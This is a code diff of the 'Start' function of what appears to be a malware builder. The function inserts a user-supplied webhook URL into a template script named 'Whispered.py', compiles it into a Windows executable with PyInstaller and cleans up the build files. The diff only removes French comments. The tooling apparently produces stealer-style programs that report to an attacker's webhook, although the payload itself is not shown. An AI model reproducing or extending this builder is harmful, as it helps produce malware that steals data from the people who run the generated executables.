@@ -33,21 +33,17 @@ def Start():
     fname = Write.Input("\n\nEnter the file name : ", Colors.purple_to_red, interval=0.025)
     sleep(1.5)
 
-    # Lire le contenu de "Whispered.py" et remplacer le webhook
     with open("Whispered.py", "r") as file:
         f = file.read()
 
     modified = f.replace("WebHook_URL", webhook)
 
-    # Écrire le contenu modifié dans un nouveau fichier Python
     with open(fname + ".py", "w") as file2:
         file2.write(modified)
 
-    # Spécifier le chemin du fichier généré par PyInstaller et son répertoire de sortie
     output_folder = current_directory + "\\EXE" 
     input_script = os.path.join(current_directory, f"{fname}.py")
 
-    # Exécuter PyInstaller
     subprocess.run([
         "pyinstaller",
         "--noconfirm",
@@ -61,11 +57,10 @@ def Start():
         input_script
     ], shell=True)
 
-    # Nettoyage des fichiers inutiles
-    shutil.rmtree('build', ignore_errors=True)  # Supprime le dossier "build"
+    shutil.rmtree('build', ignore_errors=True)
     spec_file = fname + ".spec"
     if os.path.exists(spec_file):
-        os.remove(spec_file)  # Supprime le fichier .spec
+        os.remove(spec_file)
     if os.path.exists(input_script):
         os.remove(input_script)
 
